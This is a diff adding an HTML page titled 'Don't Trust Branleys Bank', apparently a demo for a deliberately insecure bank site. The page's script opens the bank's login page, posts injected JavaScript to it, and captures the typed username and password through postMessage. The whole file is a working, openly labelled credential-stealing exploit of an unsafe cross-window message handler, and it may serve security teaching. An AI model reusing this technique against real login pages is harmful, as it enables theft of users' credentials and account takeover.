@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content="">
+    <meta name="author" content="">
+
+    <link rel="stylesheet" href="https://branleys.com/css/bootstrap.min.css">
+    <link rel="stylesheet" href="https://branleys.com/css/fontawesome.min.css">
+    <link rel="stylesheet" href="https://branleys.com/css/fonts.css">
+    <link rel="stylesheet" href="https://branleys.com/css/heroic-features.css">
+
+    <style>
+            body { color: white; background: black; line-height: 1.2; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif }
+    </style>
+</head>
+    <body>
+        <div class="container">
+        <h1>Don't Trust Branleys Bank</h1>
+
+        <p>Branleys Bank has some of the worst security in the world, click below and I can steal your credentials</p>
+
+        <button id="h">Hack It</button>
+
+        <p>
+            <div><strong>Username:</strong> <span id="u"></span></div>
+            <div><strong>Password:</strong> <span id="p"></span></div>
+        </p>
+    </div>
+
+        <script>
+            document.getElementById("h").addEventListener("click", execute_hack);
+
+            var script = "";
+            script += 'function send() { window.opener.postMessage({ "u" : document.getElementById("username").value, "p":  document.getElementById("password").value }, "http://127.0.0.1/") }'
+            script += 'document.getElementById("username").addEventListener("change", send);'
+            script += 'document.getElementById("password").addEventListener("change", send);'
+
+            function execute_hack() {
+                var windowRef = window.open('https://branleys.com/login.html');
+                windowRef.postMessage(script, "http://127.0.0.1/");
+            }
+
+            window.addEventListener("message", receiveMessage, false);
+            function receiveMessage(event) {
+                document.getElementById("u").innerHTML = event.data.u;
+                document.getElementById("p").innerHTML = event.data.p;
+            }
+        </script>
+    </body>
+</html>
